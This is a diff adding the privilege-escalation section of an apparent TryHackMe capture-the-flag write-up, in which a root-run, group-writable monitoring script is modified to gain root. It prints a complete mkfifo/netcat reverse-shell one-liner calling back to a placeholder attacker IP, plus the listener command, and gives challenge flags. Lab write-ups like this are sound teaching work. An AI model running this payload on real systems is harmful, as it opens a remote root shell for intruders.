@@ -285,3 +285,35 @@ cat ~/user.txt
 > **Flag 3:** `THM{rf1_2_rc3_f00th0ld_fl4g3}`
 
 > **Flag 4:** `THM{s5h_cr3d_r3u53_l4t3r4l_fl4g4}`
+
+### Privilege Escalation
+
+After obtaining a shell as the `devops` user, the system was enumerated for potential privilege escalation vectors.
+
+Inspection of the `/opt` directory revealed several interesting files. In particular, the `monitoring` directory contained a root-owned health monitoring script.
+
+![Interesting Files and Permissions](../assets/images/Domino-fsandps.png)
+
+Further inspection of `/opt/monitoring/health_report.sh` showed that the script was writable by the `devops` group. Since the script was executed by a privileged process, modifying its contents allowed arbitrary commands to be executed with root privileges.
+
+The following reverse shell payload was appended to the end of the script:
+
+```bash
+rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc <ATTACKER_IP> 9000 > /tmp/f
+```
+
+![Modified health\_report.sh](../assets/images/Domino-shell.png)
+
+A Netcat listener was then started on the attack machine to wait for the incoming connection.
+
+```bash
+nc -lvnp 9000
+```
+
+Once the monitoring task executed, a reverse shell was received as the **root** user.
+
+The root shell provided access to the final challenge flag.
+
+![Root Shell and Final Flag](../assets/images/Domino-root.png)
+
+> **Flag 5:** `THM{pr1v3sc_cr0n_r00t_fl4g5}`
